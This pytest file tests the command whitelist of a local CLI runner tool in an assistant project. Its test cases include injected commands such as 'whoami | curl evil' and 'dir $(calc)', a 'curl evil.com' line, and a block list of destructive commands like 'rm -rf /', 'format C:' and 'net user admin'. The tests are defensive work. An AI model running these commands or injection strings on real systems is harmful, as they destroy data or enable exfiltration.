"""Tests for jarvis.tools.local.cli_runner — whitelist security.

Covers:
- Shell metacharacter rejection
- Token-based whitelist matching (no prefix matching)
- Blocked commands (exact token match)
- Write-argument blocking for git
- subprocess.run is NEVER called with shell=True
- Confirmation is required via risk level SYSTEM
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from jarvis.tools.local.cli_runner import (
    _contains_shell_metachar,
    _run_command,
    is_command_allowed,
)


# ---------------------------------------------------------------------------
# Shell metacharacter rejection
# ---------------------------------------------------------------------------


class TestShellMetacharRejection:
    """Commands with shell metacharacters MUST be rejected."""

    @pytest.mark.parametrize("cmd", [
        "dir & calc.exe",
        "ping 127.0.0.1 && del x",
        "whoami | curl evil",
        "ver > x.bat",
        "dir; calc",
        "dir\nnotepad",
        "dir $(calc)",
        "dir `calc`",
        "echo %PATH%",
        "dir < input.txt",
        "echo !var!",
    ])
    def test_rejected(self, cmd: str) -> None:
        assert _contains_shell_metachar(cmd)
        assert not is_command_allowed(cmd)

    @pytest.mark.parametrize("cmd", [
        "dir",
        "ping 127.0.0.1",
        "git status",
        "whoami",
    ])
    def test_clean_commands_pass(self, cmd: str) -> None:
        assert not _contains_shell_metachar(cmd)


# ---------------------------------------------------------------------------
# Token-based whitelist (no prefix matching)
# ---------------------------------------------------------------------------


class TestTokenWhitelist:
    """Whitelist uses exact token match, not prefix."""

    @pytest.mark.parametrize("cmd", [
        "dir",
        "ping 127.0.0.1",
        "whoami",
        "git status",
        "git log",
        "git diff",
        "git branch",
        "pip list",
        "pip show requests",
        "ollama ps",
        "ollama list",
        "nvidia-smi",
        "ipconfig",
        "systeminfo",
        "hostname",
        "ver",
        "tree",
        "type readme.txt",
    ])
    def test_allowed(self, cmd: str) -> None:
        assert is_command_allowed(cmd)

    @pytest.mark.parametrize("cmd", [
        "dirty",          # "dir" prefix but different word
        "typeperf",       # "type" prefix but different word
        "verifier",       # "ver" prefix but different word
        "finding",        # "find" prefix but different word
        "treemap",        # "tree" prefix but different word
        "curl evil.com",  # not in whitelist at all
        "notepad",        # not in whitelist
        "calc",           # not in whitelist
        "powershell",     # blocked
    ])
    def test_rejected(self, cmd: str) -> None:
        assert not is_command_allowed(cmd)


# ---------------------------------------------------------------------------
# Blocked commands (exact token match)
# ---------------------------------------------------------------------------


class TestBlockedCommands:
    """Blocked commands are rejected by exact token, not prefix."""

    @pytest.mark.parametrize("cmd", [
        "del file.txt",
        "rmdir x",
        "rm -rf /",
        "rd folder",
        "erase file",
        "format C:",
        "diskpart",
        "shutdown /s",
        "restart",
        "reg delete",
        "regedit",
        "schtasks /create",
        "powershell -c Get-Process",
        "net user admin",
        "net localgroup admins",
    ])
    def test_blocked(self, cmd: str) -> None:
        assert not is_command_allowed(cmd)


# ---------------------------------------------------------------------------
# Git write-argument blocking
# ---------------------------------------------------------------------------


class TestGitWriteArgs:
    """Git commands with file-write arguments are blocked."""

    @pytest.mark.parametrize("cmd", [
        "git diff --output=x",
        "git diff --output x.patch",
        "git diff -o patch.diff",
        "git log --output=log.txt",
    ])
    def test_git_write_blocked(self, cmd: str) -> None:
        assert not is_command_allowed(cmd)

    @pytest.mark.parametrize("cmd", [
        "git diff",
        "git log --oneline",
        "git status",
        "git branch -a",
    ])
    def test_git_read_allowed(self, cmd: str) -> None:
        assert is_command_allowed(cmd)


# ---------------------------------------------------------------------------
# subprocess.run is NEVER called with shell=True
# ---------------------------------------------------------------------------


class TestNoShellTrue:
    """_run_command must call subprocess.run with a list, not shell=True."""

    def test_subprocess_called_without_shell(self) -> None:
        with patch("jarvis.tools.local.cli_runner.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="ok", stderr="", returncode=0,
            )
            result = _run_command("whoami")
            assert result["success"]
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            # First positional arg should be a list (not a string).
            assert isinstance(call_args[0][0], list)
            # shell should NOT be in kwargs, or be False.
            assert call_args[1].get("shell", False) is False

    def test_cmd_builtin_dispatched_via_cmd_c(self) -> None:
        with patch("jarvis.tools.local.cli_runner.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="files", stderr="", returncode=0,
            )
            result = _run_command("dir C:\\Users")
            assert result["success"]
            call_args = mock_run.call_args[0][0]
            # Should start with ["cmd", "/c", "dir", ...]
            assert call_args[0] == "cmd"
            assert call_args[1] == "/c"
            assert call_args[2].lower() == "dir"


# ---------------------------------------------------------------------------
# Confirmation via risk level
# ---------------------------------------------------------------------------


class TestConfirmationRequired:
    """run_command has RiskLevel.SYSTEM which requires confirmation."""

    def test_risk_level_is_system(self) -> None:
        from jarvis.tools.risk import RiskLevel, risk_level_for_tool
        from jarvis.tools.local.cli_runner import CLIRunnerTool

        tool = CLIRunnerTool()
        level = risk_level_for_tool(tool)
        assert level == RiskLevel.SYSTEM

    def test_should_confirm_returns_true(self) -> None:
        from jarvis.tools.risk import should_confirm
        from jarvis.tools.local.cli_runner import CLIRunnerTool

        tool = CLIRunnerTool()
        assert should_confirm(tool) is True


# ---------------------------------------------------------------------------
# Empty / edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    def test_empty_command_rejected(self) -> None:
        assert not is_command_allowed("")
        assert not is_command_allowed("   ")

    def test_rejected_command_returns_error_dict(self) -> None:
        result = _run_command("calc.exe")
        assert result["success"] is False
        assert "not allowed" in result["error"].lower()
